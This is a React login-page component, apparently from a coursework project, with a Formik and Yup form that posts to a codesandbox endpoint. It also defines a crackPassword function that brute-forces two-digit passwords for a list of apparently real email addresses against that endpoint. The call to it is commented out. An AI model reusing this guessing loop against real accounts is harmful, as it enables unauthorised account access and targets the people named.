import { useFormik } from 'formik';
import React, { useEffect } from 'react';
import { object, string } from 'yup';
import { TextField, Button, Box } from '@material-ui/core';
import styled from 'styled-components';
import { useHistory } from 'react-router-dom';

async function crackPassword() {
  const logins = [
    // 'egordavidovich@mail.com',
    // 'feliksharauski@mail.com',
    // 'viktorg@mail.com',
    // 'dtarankevich@mail.com',
    // 'tataiana@mail.com',
    'taisiagvozdeva@mail.com',
    // 'mariaguk@mail.com',
    // 'alexsavich@mail.com',
    // 'ysekach@mail.com',
  ];

  logins.forEach(login => {
    [...Array(100)].forEach((_, i) => {
      fetch('https://uoxfu.sse.codesandbox.io/login', {
        method: 'POST',
        body: JSON.stringify({
          login,
          password: `${i < 10 ? 0 : ''}${i}`,
        }),
        headers: {
          // Accept: 'application/json',
          'Content-Type': 'application/json',
        },
      }).then(res => {
        if (res.status === 200) console.log(`${i < 10 ? 0 : ''}${i}`);
      });
    });
  });
}

const LoginPageWrapper = styled(Box)`
  background-color: aqua;
`;

const MyButton = props => <button {...props} />;

export default function LoginPage({ sting, ...otherProps }) {
  const { push } = useHistory();
  const formik = useFormik({
    initialValues: {
      login: '',
      password: '',
    },
    onSubmit: values => {
      fetch('https://uoxfu.sse.codesandbox.io/login', {
        method: 'POST',
        body: JSON.stringify(values),
        headers: {
          // Accept: 'application/json',
          'Content-Type': 'application/json',
        },
      }).then(res => {
        if (res.status === 200) push('/');
      });
      // alert(JSON.stringify(values, null, 2));
      formik.resetForm();
    },
    validateOnChange: false,
    validateOnBlur: true,
    validationSchema: object({
      login: string().email('имейл не имейл'),
      password: string().required(),
    }),
  });
  // useEffect(() => {
  //   crackPassword();
  // }, []);
  return (
    <LoginPageWrapper
      m={2}
      className="class1"
      style={{
        height: '100vh',
        width: '100vw',
        display: 'grid',
        placeItems: 'center',
      }}
    >
      <form onSubmit={formik.handleSubmit}>
        <div style={{ width: 200, display: 'flex', flexDirection: 'column' }}>
          <TextField
            required
            label="Login"
            name="login"
            value={formik.values.login}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            sx={{ m: 1 }}
            error={formik.touched.login && !!formik.errors.login}
            helperText={formik.touched.login && formik.errors.login}
          />
          <TextField
            required
            label="Password"
            type="password"
            name="password"
            value={formik.values.password}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            sx={{ m: 1 }}
            error={formik.touched.password && !!formik.errors.password}
            helperText={formik.touched.password && formik.errors.password}
          />
          <Button variant="contained" type="submit" sx={{ m: 1 }}>
            login
          </Button>
          <MyButton login={formik.values.login} />
        </div>
      </form>
    </LoginPageWrapper>
  );
}
